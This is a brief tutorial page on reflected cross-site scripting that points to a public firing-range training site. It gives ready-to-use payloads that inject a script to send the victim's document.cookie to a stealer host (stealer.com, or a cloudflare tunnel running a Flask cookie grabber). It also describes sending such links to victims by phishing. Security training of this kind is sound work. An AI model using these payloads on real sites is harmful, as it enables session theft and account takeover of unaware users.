<h1>Reflected Cross-Site Scripting</h1>

This technique allows attackers to craft modified links to vulnerable websites and send them to unaware vitims (for example with fishing links).
The modifications are utilized to i.e. trigger a remote script via exploitable parameters. See <a href="https://public-firing-range.appspot.com/"> 🎯 Appspot Firing Range 🔥</a> for training sites with this kind of vulnerability.
One way to exploit is to inject a code with a script that reads the cookie. The cookie is handed as a parameter for a website on a stealer-server:

<pre>https://victim.com/site?vuln_param=X<script>fetch('https://stealer.com/grab?c='+encodeURIComponent(document.cookie))</script></pre>

Try this example to test a parameter in the body-part of a site:
<pre>https://public-firing-range.appspot.com/reflected/parameter/body/400?q=PLACEHOLDER<script>alert("VULNERABLE");</script></pre>

Try this with a running Flask cookie grabber and a cloudflare tunnel:
https://public-firing-range.appspot.com/reflected/parameter/body?q=a<script>fetch('https://[IDENTIFIER].trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script>

The cookie grabber adds the stolen cookies as soon as the victim opens the modified link and adds a timstamp. 
